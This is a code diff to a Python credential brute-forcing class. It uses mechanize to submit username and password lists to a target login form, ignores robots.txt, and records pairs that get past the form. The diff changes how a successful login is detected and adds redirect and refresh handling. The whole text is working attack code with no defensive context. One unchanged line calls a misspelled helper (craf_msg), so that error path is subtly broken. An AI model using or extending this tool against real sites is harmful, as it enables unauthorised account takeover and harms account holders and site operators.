@@ -61,8 +61,6 @@ class BruteForcing(object):
 		return self.fndData
 
 	def run(self):
-		oldPass = '' # Stores previous passowrd in the loop. Useful for current code logic
-
 		#Start brute forcing
 		for idxUsername in self.lstUsername:
 
@@ -71,6 +69,9 @@ class BruteForcing(object):
 
 			proc = mechanize.Browser()
 			proc.addheaders = [('User-Agent', self.varUserAgent)]
+			proc.set_handle_redirect(True)
+			proc.set_handle_referer(True)
+			proc.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=2)
 			proc.set_handle_robots(False)
 			proc.open(self.varTargetURL)
 
@@ -83,21 +84,20 @@ class BruteForcing(object):
 					proc.form[self.frmPassField] = idxPasswd
 					count += 1
 					utils.prints("%10s : %20s%12s%10s / %10s" %(idxUsername, idxPasswd, '=' * 6, count, self.szPassword))
-					proc.submit()
+					req = proc.submit()
+					try:
+						proc.reload()
+						proc.select_form(nr = self.frmLoginID)
+					except mechanize._mechanize.FormNotFoundError:
+						utils.printf("Found: %s:%s" %(idxUsername, idxPasswd), "good")
+						self.fndData.append([idxUsername, idxPasswd])
+						break
 
 				except mechanize.HTTPError as error:
 					sys.exit(utils.craf_msg(error, "bad"))
 
 				except KeyboardInterrupt:
 					sys.exit(utils.craft_msg("Terminated!!!", "bad"))
-
-				except mechanize._mechanize.FormNotFoundError:
-					utils.printf("Found: %s:%s" %(idxUsername, oldPass), "good")
-					self.fndData.append([idxUsername, oldPass])
-					break
-
-				finally:
-					oldPass = idxPasswd
 
 			if count == self.szPassword:
 				utils.printf("%s: No match found." %(idxUsername), "bad")
